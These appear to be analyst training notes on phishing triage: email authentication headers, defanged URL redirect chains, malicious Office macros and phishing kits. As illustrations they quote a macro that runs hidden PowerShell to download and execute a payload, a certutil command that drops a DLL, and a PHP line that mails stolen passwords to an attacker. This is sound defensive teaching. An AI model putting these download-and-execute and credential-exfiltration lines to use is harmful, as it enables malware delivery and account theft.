Elaborated Notes with Examples
1. SPF, DKIM, DMARC Headers

Email authentication headers verify sender legitimacy. SPF checks if the sending IP is authorized by the domain's DNS TXT record. DKIM uses a cryptographic signature to verify email integrity. DMARC tells receivers how to handle failures (none/quarantine/reject).

Example: A phishing email claims to be from paypal.com but headers show:
Authentication-Results: spf=softfail (sender IP 185.130.5.201 is not allowed)
dkim=fail (signature did not verify)
dmarc=fail (p=reject)
The Return-Path is bounce@evil-phish.com and Received-SPF: None. The analyst blocks the sending IP and domain, and updates the mail gateway rule to strip attachments from domains with no DMARC policy.
2. URL Analysis

Suspicious URLs in emails should be defanged, analyzed via sandbox (URLScan.io, VirusTotal), and checked for redirect chains, typosquatting, and shortened links (bit.ly, t.co).

Example: The email body contains <a href="hxxp://bit[.]ly/3xK9mN2">Click to Verify</a>. After defanging, the analyst submits to URLScan.io. The redirect chain resolves: bit.ly -> hxxp://evil[.]com/login.php?email=phished%40corp.com. The final page is a cloned Microsoft 365 login page. The domain evil[.]com was registered 2 days ago with privacy protection. The page uses a self-signed TLS certificate.
3. Attachment Analysis (Macros)

Malicious attachments include .docm, .xlsm, .js, .vbs, .wsf, .hta, and archive bombs. Macros in Office documents use VBA to download/execute payloads. Static analysis with oledump and dynamic analysis in a sandbox are critical.

Example: The attachment Invoice_2026.docm contains auto-executing VBA macro at stream M 7 (from oledump):
Private Sub Document_Open()
  Set obj = CreateObject("Wscript.Shell")
  obj.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4..."
End Sub
The base64 decodes to IEX (New-Object Net.WebClient).DownloadString('hxxp://evil/payload.ps1'). The macro also calls Shell("cmd /c certutil -urlcache -f hxxp://evil/dll.dll %TEMP%\msi.dll") to drop a side-loaded DLL.
4. Phishing Kits

Phishing kits are pre-packaged sets of HTML, PHP, CSS, and JavaScript files that replicate legitimate login pages. They often include telemetry code and exfiltrate credentials via email or PHP POST. Analyzing the kit reveals the attacker's email address and exfiltration endpoint.

Example: The phishing page login.php contains:
<form method="POST" action="send.php">
In send.php: mail("attacker@tutanota.com", "Creds: ".$_POST['email'], $_POST['password']);
The kit also writes captured credentials to a text file on the server. The analyst identifies the kit as "16Shop" targeting Microsoft 365 users, and uses this intel to block the attacker email and search for related domains via passive DNS.
